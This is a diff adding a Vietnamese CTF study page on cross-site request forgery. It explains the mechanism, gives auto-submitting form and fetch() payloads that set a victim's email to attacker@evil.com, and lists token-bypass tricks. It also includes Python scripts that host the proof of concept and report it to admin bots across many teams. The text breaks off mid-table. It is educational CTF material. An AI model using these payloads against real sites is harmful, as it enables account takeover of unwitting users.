@@ -1,0 +1,525 @@
+<title>CSRF — Cross-Site Request Forgery — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · CSRF, CORS, Redirect</div>
+    <h1>CSRF — Cross-Site Request Forgery</h1>
+    <p class="sub">Khi 1 chức năng đổi trạng thái (đổi mật khẩu, chuyển tiền, đổi quyền) chỉ dựa vào
+    <strong>cookie</strong> để xác thực mà không kiểm tra gì thêm — bạn tạo 1 trang độc lập tự động submit form
+    tới chức năng đó, gửi cho nạn nhân (thường là admin bot) xem; trình duyệt nạn nhân tự đính kèm cookie của họ,
+    khiến request "trông như chính họ gửi" dù họ không hề biết.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>CSRF là gì, để làm gì?</h2>
+  <p class="lead">Trình duyệt có 1 hành vi mặc định: khi gửi request tới 1 domain, nó <strong>tự động đính kèm
+  mọi cookie</strong> đã lưu cho domain đó — kể cả khi request được "khởi xướng" từ 1 trang web hoàn toàn khác.
+  Nếu app chỉ dựa vào cookie để biết "ai đang thao tác" (không có token xác nhận riêng), bạn có thể tạo 1 trang
+  HTML độc lập (không cần XSS, không cần chèn gì vào app thật) tự động submit form tới app đó — khi admin bot mở
+  trang độc của bạn, trình duyệt họ tự gửi kèm cookie thật, request trông y hệt chính admin đang thao tác.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Khác XSS (cần chèn CODE vào app thật), CSRF chỉ cần 1 trang HTML <strong>độc lập, không liên quan gì tới app
+  đích</strong> — điểm yếu nằm ở việc app <strong>tin cookie mù quáng</strong>, không phải ở chỗ app có lỗ hổng
+  chèn code nào. Luôn đi kèm admin bot (giống XSS) vì cần nạn nhân "mở hộ" trang độc đó.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ CSRF</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Chức năng đổi trạng thái (đổi email, đổi mật khẩu, chuyển điểm, xóa tài khoản) dùng <code>&lt;form&gt;</code>
+        hoặc API chỉ check cookie, <strong>KHÔNG</strong> có thêm field token lạ (vd <code>csrf_token</code>) ẩn
+        trong form.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Có cơ chế admin bot (CSRF chỉ có tác dụng khi nạn nhân thật sự mở trang độc của bạn trong khi đang đăng
+        nhập app đích).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Gửi request đổi trạng thái qua Burp, xem request có field <code>csrf_token</code>/<code>_token</code>
+        không — nếu không có field nào như vậy ⟹ nghi CSRF cao.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (HTML tự submit)</span>
+<pre><code>&lt;!-- Lưu thành file .html, báo URL file này cho admin bot --&gt;
+&lt;html&gt;&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="http://TARGET/change-email" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests
+
+html = <span class="s">'''&lt;html&gt;&lt;body onload="document.forms[0].submit()"&gt;
+&lt;form action="http://TARGET/change-email" method="POST"&gt;
+&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'''</span>
+<span class="c"># Host file này (python -m http.server) rồi báo URL cho admin bot (giống bài XSS mục 07)</span>
+requests.post(<span class="s">"http://TARGET/report"</span>, data={<span class="s">"url"</span>: <span class="s">"http://YOUR_IP:8000/csrf.html"</span>})</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Request cần là POST với body form-data? Form HTML tự submit được mọi method GET/POST. Nếu cần gửi JSON
+        → form HTML thường không làm được trực tiếp, xem mục 06. WAF <strong>không chặn được CSRF</strong> theo
+        payload (trang độc nằm ngoài, không gửi qua WAF của app đích) — phòng thủ thật là CSRF token trong code,
+        không thể làm qua WAF (xem mục 10). Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Cookie tự động đính kèm</b> — khi trình duyệt gửi request tới domain X, nó tự thêm MỌI
+  cookie đã lưu cho domain X vào request đó — <strong>bất kể trang nào khởi xướng request này</strong> (trang
+  của chính X, hay 1 trang hoàn toàn khác bạn đang mở).</div>
+  <div class="def"><b>CSRF token</b> — 1 chuỗi ngẫu nhiên, duy nhất cho mỗi phiên/mỗi form, server nhúng vào form
+  thật (field ẩn) và kiểm tra lại khi nhận request. Trang độc lập của kẻ tấn công <strong>không biết</strong>
+  giá trị token này (vì chưa từng load được trang form thật — bị Same-Origin Policy chặn đọc nội dung trang
+  domain khác), nên không thể giả mạo đúng.</div>
+  <div class="def"><b>SameSite cookie</b> — thuộc tính cookie hiện đại (<code>Strict</code>/<code>Lax</code>/<code>None</code>)
+  quyết định cookie có được gửi kèm khi request bắt nguồn từ domain khác hay không — <code>Strict</code>/<code>Lax</code>
+  (mặc định ở trình duyệt mới) đã tự chặn phần lớn CSRF cổ điển mà không cần code thêm gì.</div>
+  <p>Code hay viết (thiếu CSRF token):</p>
+  <pre><code><span class="c">// Node/Express -- chỉ check session cookie, không có csrf middleware</span>
+app.post(<span class="s">'/change-email'</span>, requireLogin, (req, res) => {
+  user.email = req.body.email;   <span class="c">// không hề kiểm tra request này có thật sự "chủ ý" từ user không</span>
+});</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Cookie chứng minh "đã đăng nhập", không chứng minh "chủ ý thao tác"</h2>
+  <p>Có cookie hợp lệ chỉ nói lên 1 điều: trình duyệt này <em>đã từng</em> đăng nhập thành công. Nó
+  <strong>không</strong> nói lên "người dùng thực sự muốn thực hiện hành động NÀY, NGAY BÂY GIỜ". Nhầm lẫn giữa
+  2 khái niệm này — "đã xác thực" và "có chủ ý" — chính là gốc rễ CSRF. Cách vá đúng cần thêm 1 bằng chứng
+  <strong>chỉ trang thật mới có</strong> (CSRF token), vì trang độc của kẻ tấn công dù khiến trình duyệt tự gửi
+  cookie được, vẫn <strong>không đọc được nội dung trang thật</strong> để lấy đúng token đó (do Same-Origin
+  Policy chặn đọc dữ liệu cross-origin, dù vẫn cho GỬI request cross-origin).</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Trang độc lập "mượn" cookie của nạn nhân</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr17)}
+    </style>
+    <defs><marker id="arr17" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">Bạn host:</text>
+    <text x="22" y="56" class="lbl-a">evil.com/csrf.html</text>
+
+    <path d="M210,48 H248" class="arrow"/>
+    <rect x="253" y="20" width="200" height="55" rx="10" class="box"/>
+    <text x="265" y="40" class="lbl-m">Admin bot mở evil.com</text>
+    <text x="265" y="56" class="lbl">form tự auto-submit</text>
+
+    <path d="M453,48 H490" class="arrow"/>
+    <rect x="495" y="20" width="175" height="55" rx="10" class="box-a"/>
+    <text x="507" y="40" class="lbl-m">POST tới TARGET.com</text>
+    <text x="507" y="56" class="lbl-a">kèm cookie THẬT của admin</text>
+
+    <path d="M580,80 V105" class="arrow"/>
+    <rect x="253" y="110" width="200" height="50" rx="10" class="box-a"/>
+    <text x="265" y="130" class="lbl-m">Server TARGET.com</text>
+    <text x="265" y="146" class="lbl-a">thấy cookie hợp lệ -&gt; THỰC HIỆN</text>
+  </svg>
+  </div>
+  <p>Điểm mấu chốt: <strong>evil.com không bao giờ đọc được cookie của TARGET.com</strong> (Same-Origin Policy
+  chặn JavaScript đọc cookie cross-domain) — nhưng nó <strong>không cần đọc</strong>, chỉ cần khiến trình duyệt
+  <em>tự gửi</em> cookie đó đi, việc mà Same-Origin Policy <strong>không</strong> ngăn cản (gửi request
+  cross-origin luôn được phép, chỉ đọc response/cookie cross-origin mới bị chặn).</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Form đổi trạng thái không có field ẩn kiểu <code>csrf_token</code>/<code>_csrf</code>/<code>authenticity_token</code></td><td>Nghi CSRF cao</td></tr>
+    <tr><td>Có field token nhưng giá trị giống nhau ở mọi request/không đổi theo session</td><td>Token tồn tại nhưng không được validate đúng — vẫn có thể bypass</td></tr>
+    <tr><td>API chấp nhận cả khi thiếu hẳn token (chỉ dựa cookie)</td><td>Token có tồn tại ở form thật nhưng server không enforce kiểm tra</td></tr>
+    <tr><td>Response header không có <code>Set-Cookie: ...; SameSite=Strict/Lax</code></td><td>Cookie không có SameSite, hoặc <code>SameSite=None</code> — CSRF cổ điển vẫn khả thi</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Burp có tính năng tự sinh HTML PoC CSRF</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request đổi trạng thái (vd đổi email) đã gửi thành công khi đăng nhập, trong tab Proxy/HTTP history.</li>
+    <li>Chuột phải vào request → <strong>"Engagement tools" → "Generate CSRF PoC"</strong> — Burp tự tạo sẵn
+    file HTML form auto-submit khớp đúng tham số của request đó.</li>
+    <li>Burp cho xem trước PoC ngay trong tab mới — bấm "Test in browser" để tự kiểm tra trước khi gửi cho bot
+    thật.</li>
+    <li>Lưu file HTML, host bằng <code>python3 -m http.server</code>, báo URL cho admin bot.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO TÌNH HUỐNG</div>
+  <h2>HTML PoC theo từng kiểu request</h2>
+
+  <h3>A. GET request (đơn giản nhất, chỉ cần link)</h3>
+  <pre><code>&lt;img src="http://TARGET/delete-account?confirm=yes"&gt;
+<span class="c">// hoặc đơn giản hơn: chỉ cần report thẳng URL này cho bot, không cần file HTML riêng</span></code></pre>
+
+  <h3>B. POST form-urlencoded</h3>
+  <pre><code>&lt;html&gt;&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="http://TARGET/change-email" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+  <h3>C. POST JSON (form HTML không gửi được trực tiếp — cần JS fetch)</h3>
+  <pre><code>&lt;script&gt;
+fetch('http://TARGET/api/change-email', {
+  method: 'POST',
+  credentials: 'include',   <span class="c">// bắt buộc để trình duyệt đính kèm cookie cross-origin</span>
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'attacker@evil.com'})
+});
+&lt;/script&gt;</code></pre>
+  <div class="note tip"><span class="tag">Vì sao cách C vẫn là CSRF, không phải "cần XSS"</span>Đoạn script này
+  nằm trong trang <strong>của bạn</strong> (evil.com), không chèn vào app đích — vẫn là file HTML độc lập, chỉ
+  khác ở chỗ dùng <code>fetch()</code> thay <code>&lt;form&gt;</code> để gửi được Content-Type JSON mà form HTML
+  thường không hỗ trợ.</div>
+
+  <h3>D. Bypass khi có CSRF token yếu</h3>
+  <table>
+    <tr><th>Lỗi validate token thường gặp</th><th>Cách khai thác</th></tr>
+    <tr><td>Token không kiểm tra (chỉ có mặt trong form, server không check lại)</td><td>Bỏ hẳn field token khỏi PoC, request vẫn thành công</td></tr>
+    <tr><td>Token dùng chung 1 giá trị cố định cho mọi session</td><td>Copy token đó (dễ lấy nếu bạn tự đăng ký 1 tài khoản, xem token của chính mình) vào PoC</td></tr>
+    <tr><td>Chỉ kiểm tra token CÓ MẶT, không kiểm tra giá trị đúng</td><td>Gửi token rỗng hoặc bất kỳ chuỗi nào</td></tr>
+    <tr><td>Kiểm tra <code>Referer</code>/<code>Origin</code> header nhưng cho phép thiếu header này</td><td>1 số trình duyệt/cách gửi (vd thẻ <code>&lt;img&gt;</code>, redirect meta refresh) không gửi Referer — thử các cách tạo request không có header đó</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: BURP CSRF POC GENERATOR</div>
+  <h2>Không muốn tự viết HTML form tay? Để Burp tự sinh</h2>
+  <p>Đã nhắc ở mục 05 — đây là tính năng <strong>có sẵn trong Burp</strong> (không cần cài thêm extension),
+  nhanh hơn tự viết tay vì Burp tự điền đúng URL/tham số từ request thật đã bắt được, giảm khả năng gõ sai tên
+  field.</p>
+  <p>Tham khảo thêm payload/kỹ thuật bypass token: <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Cross-Site Request Forgery/</code>.</p>
+  <p>Listener để host file PoC: dùng lại <code>python3 -m http.server 8000</code> (giống các bài XSS/XXE/SSRF).</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+<span class="c"># Bước 1: tạo file PoC trên đĩa</span>
+poc = <span class="s">'''&lt;html&gt;&lt;body onload="document.forms[0].submit()"&gt;
+&lt;form action="http://TARGET/change-email" method="POST"&gt;
+&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'''</span>
+open(<span class="s">"csrf.html"</span>, <span class="s">"w"</span>).write(poc)
+
+<span class="c"># Bước 2: host bằng `python3 -m http.server 8000` ở terminal khác, rồi report cho bot</span>
+requests.post(<span class="s">"http://TARGET/report"</span>, data={<span class="s">"url"</span>: <span class="s">"http://YOUR_IP:8000/csrf.html"</span>})</code></pre>
+
+  <h3>(B) Bản gọn chắc — tự host PoC + report trong cùng script</h3>
+  <pre><code><span class="k">import</span> requests, threading, http.server, socketserver
+
+PORT = 8000
+POC = <span class="s">'''&lt;html&gt;&lt;body onload="document.forms[0].submit()"&gt;
+&lt;form action="http://TARGET/change-email" method="POST"&gt;
+&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'''</span>
+
+<span class="k">class</span> <span class="d">Handler</span>(http.server.BaseHTTPRequestHandler):
+    <span class="k">def</span> <span class="d">do_GET</span>(self):
+        self.send_response(200); self.send_header(<span class="s">"Content-Type"</span>, <span class="s">"text/html"</span>); self.end_headers()
+        self.wfile.write(POC.encode())
+    <span class="k">def</span> <span class="d">log_message</span>(self, *args): <span class="k">pass</span>
+
+threading.Thread(target=<span class="k">lambda</span>: socketserver.TCPServer((<span class="s">""</span>, PORT), Handler).serve_forever(), daemon=<span class="k">True</span>).start()
+
+<span class="k">def</span> <span class="d">exploit_csrf</span>(host, my_ip):
+    requests.post(<span class="s">f"http://{host}/report"</span>, data={<span class="s">"url"</span>: <span class="s">f"http://{my_ip}:{PORT}/"</span>}, timeout=5)
+
+exploit_csrf(<span class="s">"TARGET_IP"</span>, <span class="s">"YOUR_IP"</span>)</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> requests
+
+MY_IP = <span class="s">"10.10.X.X"</span>   <span class="c"># IP thật của bạn trong mạng thi, listener đã chạy sẵn 1 lần từ đầu round</span>
+
+<span class="k">def</span> <span class="d">exploit_csrf</span>(host):
+    <span class="k">try</span>:
+        requests.post(<span class="s">f"http://{host}/report"</span>, data={<span class="s">"url"</span>: <span class="s">f"http://{MY_IP}:8000/"</span>}, timeout=5)
+        <span class="k">return</span> <span class="k">True</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">False</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        exploit_csrf(host)
+<span class="c"># Flag/kết quả xem trực tiếp trên service đội mình sau khi admin bot của HỌ chạy xong (nếu CSRF này tự thực
+# hiện hành động lộ flag), hoặc qua listener nếu PoC có kèm exfiltrate dữ liệu.</span></code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có trang "Account Settings" — đổi email bằng form POST, không thấy field CSRF token nào.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận thiếu token</div><div class="d">Burp bắt request đổi email, xem toàn bộ body — chỉ có field <code>email</code>, không có token ⟹ nghi CSRF.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Sinh PoC</div><div class="d">Burp "Generate CSRF PoC" từ request đó, lưu file.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Host &amp; report</div><div class="d">Host file bằng http.server, báo URL cho admin bot qua form "Report URL".</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Admin bot mở PoC, email admin bị đổi thành <code>attacker@evil.com</code> ⟹ dùng chức năng "Quên mật khẩu" gửi link reset về email đó, chiếm tài khoản admin, lấy flag từ trang admin.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ — KHÓ DÙNG WAF, CẦN SỬA LOGIC</div>
+  <h2>Vì sao CSRF không chặn được bằng WAF</h2>
+  <div class="note warn"><span class="tag">Trang độc nằm NGOÀI service của bạn</span>Kẻ tấn công gửi PoC từ
+  domain hoàn toàn khác (evil.com), WAF của bạn chỉ soi request <strong>gửi tới</strong> service mình — nó thấy
+  request CSRF y hệt request hợp lệ (cùng cấu trúc, chỉ thiếu token mà bản thân app cũng không kiểm tra). Không
+  có "payload bất thường" nào để WAF nhận diện.</div>
+  <table>
+    <tr><th>Việc có thể làm (hạn chế, không triệt để)</th><th>Hiệu quả</th></tr>
+    <tr><td>Kiểm tra header <code>Origin</code>/<code>Referer</code> qua WAF rule, chặn nếu khác domain của app</td><td>Giảm được CSRF cổ điển qua form đơn giản, nhưng A/D không cho sửa source để thêm check này ở app — WAF có thể làm được 1 phần nếu header này luôn có mặt (không phải lúc nào cũng đúng)</td></tr>
+  </table>
+  <p>Giống IDOR/Race Condition/Type Juggling, đây là nhóm lỗ hổng mà phòng thủ thật sự (thêm CSRF token vào
+  code) <strong>không làm được trong khuôn khổ A/D</strong> (cấm sửa source) — thiên hẳn về phía tấn công.</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi PoC không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
